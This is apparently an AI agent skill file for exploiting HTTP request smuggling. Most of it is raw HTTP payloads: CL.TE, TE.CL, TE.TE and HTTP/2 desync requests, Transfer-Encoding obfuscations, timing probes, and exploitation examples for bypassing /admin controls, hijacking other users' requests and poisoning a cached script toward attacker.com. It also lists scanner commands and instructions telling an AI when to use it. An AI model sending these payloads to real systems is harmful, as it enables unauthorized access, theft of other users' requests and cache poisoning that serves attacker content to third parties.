# HTTP Request Smuggling Skill

## Goal

Exploit HTTP request smuggling vulnerabilities to bypass security controls, poison caches, or hijack requests.

## Methodology

1. **Identify Infrastructure:** Detect front-end/back-end proxy configurations
2. **Test for Desync:** Probe for CL.TE, TE.CL, or TE.TE vulnerabilities
3. **Confirm Vulnerability:** Use timing-based or differential detection
4. **Craft Exploit:** Smuggle requests to bypass controls or poison cache
5. **Escalate Attack:** Chain with XSS, auth bypass, or request hijacking

## Smuggling Techniques

### CL.TE (Content-Length prioritized by front-end, Transfer-Encoding by back-end)
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### TE.CL (Transfer-Encoding prioritized by front-end, Content-Length by back-end)
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```

### TE.TE (Both support TE but one can be obfuscated)
```http
POST / HTTP/1.1
Host: vulnerable.com
Transfer-Encoding: chunked
Transfer-Encoding: x

0

SMUGGLED
```

## Obfuscating Transfer-Encoding

```http
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
Transfer-Encoding:chunked
X: X[\n]Transfer-Encoding: chunked
```

## Detection Payloads

### Timing-Based Detection (CL.TE)
```http
POST / HTTP/1.1
Host: vulnerable.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```

### Timing-Based Detection (TE.CL)
```http
POST / HTTP/1.1
Host: vulnerable.com
Transfer-Encoding: chunked
Content-Length: 6

0

X
```

## Exploitation Examples

### Bypass Front-End Security
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 54
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable.com
X-Ignore: 
```

### Request Hijacking
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 100
Transfer-Encoding: chunked

0

POST /log HTTP/1.1
Host: vulnerable.com
Content-Length: 100

data=
```

### Cache Poisoning
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 130
Transfer-Encoding: chunked

0

GET /static/main.js HTTP/1.1
Host: vulnerable.com
X-Forwarded-Host: attacker.com

```

## H2.CL Smuggling (HTTP/2 to HTTP/1.1)
```http
:method: POST
:path: /
:authority: vulnerable.com
content-length: 0

GET /admin HTTP/1.1
Host: vulnerable.com
```

## Tools

* **Burp Suite Turbo Intruder** - Automated smuggling detection
* **smuggler** - HTTP request smuggling scanner
* **h2csmuggler** - HTTP/2 smuggling tool

## Example Commands

```bash
# Using smuggler
python3 smuggler.py -u https://target.com

# HTTP/2 smuggling detection
python3 h2csmuggler.py -x https://target.com -t 1
```

## Guidance for AI

* Activate when testing applications behind proxies/CDNs
* Start with timing-based detection to identify vulnerability type
* CL.TE and TE.CL require careful Content-Length calculations
* Modern HTTP/2 downgrades can introduce new smuggling vectors
* Burp Suite's HTTP/2 support is essential for testing
* Be careful: smuggling affects other users' requests
* Test in isolated environments when possible
